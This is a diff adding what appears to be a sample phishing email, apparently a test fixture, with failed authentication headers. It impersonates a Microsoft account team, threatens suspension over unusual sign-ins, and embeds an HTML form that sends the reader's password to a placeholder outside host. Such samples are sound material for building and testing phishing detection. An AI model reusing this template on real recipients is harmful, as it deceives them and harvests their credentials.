@@ -1,0 +1,27 @@
+From: "Microsoft Account Team" <security@ms-account-verify.example>
+To: victim@corp.example
+Reply-To: billing@ms-account-verify.example
+Subject: Account review form
+Authentication-Results: mx.corp.example; spf=fail; dkim=fail; dmarc=fail
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============4058967977194445394=="
+
+--===============4058967977194445394==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Our records show unusual sign-in activity. Please verify your account at http=
+s://secure-login.account-check.example/verify to avoid suspension.
+
+--===============4058967977194445394==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+MIME-Version: 1.0
+
+<!doctype html><html><body><h1>Account review</h1>
+        <form action='https://account-check.example/submit'>
+        <label>Password <input type='password' name='password'></label>
+        </form></body></html>
+
+--===============4058967977194445394==--
